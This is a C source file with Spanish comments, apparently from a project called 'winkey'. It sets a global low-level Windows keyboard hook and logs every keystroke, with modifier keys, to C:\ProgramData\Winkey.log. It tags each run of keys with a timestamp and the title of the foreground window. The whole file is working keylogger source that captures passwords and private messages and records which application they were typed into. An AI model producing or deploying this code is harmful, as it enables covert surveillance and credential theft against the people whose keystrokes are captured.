#include "winkey.h"

// Variable global para el hook
static HHOOK g_hHook = NULL;
FILE* logFile = NULL;
static HWND lastHwnd = NULL;

void LogWindowChangeIfNeeded(HWND currentHwnd) {
    if (currentHwnd != lastHwnd) {
        lastHwnd = currentHwnd;

        // Obtener el título de la ventana
        WCHAR windowTitle[256];
        GetWindowTextW(currentHwnd, windowTitle, 256);

        // Obtener el timestamp
        time_t t = time(NULL);
        struct tm tm_info;
        localtime_s(&tm_info, &t);
        char timeString[30];
        strftime(timeString, sizeof(timeString), "%d.%m.%Y %H:%M:%S", &tm_info);

        // Escribir la cabecera en el log
        if (logFile) {
            char title_mb[256];
            WideCharToMultiByte(CP_UTF8, 0, windowTitle, -1, title_mb, sizeof(title_mb), NULL, NULL);
            fprintf(logFile, "\n\n[%s] - '%s'\n", timeString, title_mb);
            fflush(logFile);
        }
    }
}

// Funcion para crear/abrir archivo de log
BOOL CreateLogFile(void)
{
    WCHAR path[MAX_PATH];
    // Obtener la ruta a "C:\ProgramData" del usuario
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))) {
        // Concatenar el nombre del archivo de log
        wcscat_s(path, MAX_PATH, L"\\Winkey.log");
        // convertir la ruta WCHAR a char para fopen_s
        char finalPath_mb[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, path, -1, finalPath_mb, sizeof(finalPath_mb), NULL, NULL);

        errno_t err = fopen_s(&logFile, finalPath_mb, "a"); // Usar "a" (append) para no borrar en cada reinicio
        if (err != 0 || !logFile) {
            return FALSE;
        }
        return TRUE;
    }

    // Fallback por si no se puede obtener la ruta de documentos
    errno_t err = fopen_s(&logFile, "winkey_fallback.log", "a");
    if (err != 0 || !logFile) {
        return FALSE;
    } 
    return TRUE;
}

void AppendModifiers(char* buffer, size_t bufferSize, DWORD vkCode)
{
    static int lastShift = 0;
    static int lastCtrl = 0;
    static int lastAlt = 0;

    int shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    int ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
    int alt   = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

    // Si la tecla pulsada es un modificador, solo registrar la transición
    if ((vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) && shift && !lastShift)
        strcat_s(buffer, bufferSize, "[SHIFT+]");
    else if ((vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) && ctrl && !lastCtrl)
        strcat_s(buffer, bufferSize, "[CTRL+]");
    else if ((vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) && alt && !lastAlt)
        strcat_s(buffer, bufferSize, "[ALT+]");
    // Si la tecla pulsada NO es un modificador, añade todos los modificadores activos
    else if (!(vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
               vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
               vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU)) {
        if (ctrl)  strcat_s(buffer, bufferSize, "[CTRL+]");
        if (alt)   strcat_s(buffer, bufferSize, "[ALT+]");
        if (shift) strcat_s(buffer, bufferSize, "[SHIFT+]");
    }

    lastShift = shift;
    lastCtrl = ctrl;
    lastAlt = alt;
}

// Funcion que se ejecuta cada vez que se pulsa una tecla
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) 
{

    if (nCode == HC_ACTION) {
        // Procesar y escribir la tecla
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = p->vkCode;  // Código virtual de la tecla

        // Solo procesar eventos de tecla presionada
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            
            // Obtener la ventana actual
            HWND currentHwnd = GetForegroundWindow();
            
            // gestionar el cambio de ventana
            LogWindowChangeIfNeeded(currentHwnd);

            // Construir string legible
            char logStr[64] = {0};
            AppendModifiers(logStr, sizeof(logStr), vkCode);
            strcat_s(logStr, sizeof(logStr), VkCodeToString(vkCode));
            

            // Guardar en el log
            if (logFile) {
                fprintf(logFile, "%s", logStr);
                fflush(logFile);
            }

            // Ver en terminal las teclas pulsadas ejecutando winkey.exe 
            //printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
            //printf("vkCode: %lu, scanCode: %lu, char: %s\n", vkCode, p->scanCode, keyChar);
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}


// Activar hook
BOOL ActivateHook(void)
{
    // Crear archivo de log
    if (!CreateLogFile()) {
        return FALSE;
    }

    // Activar el hook
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_hHook) {
        printf("Error to create the hook\n");
        return FALSE;
    }
    return TRUE;
}

void DeactivateHook(void)
{
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
        printf("Hook desactivado.\n");
    }

    // Cerrar archivo
    if (logFile) {
        fclose(logFile);
        logFile = NULL;
    }
}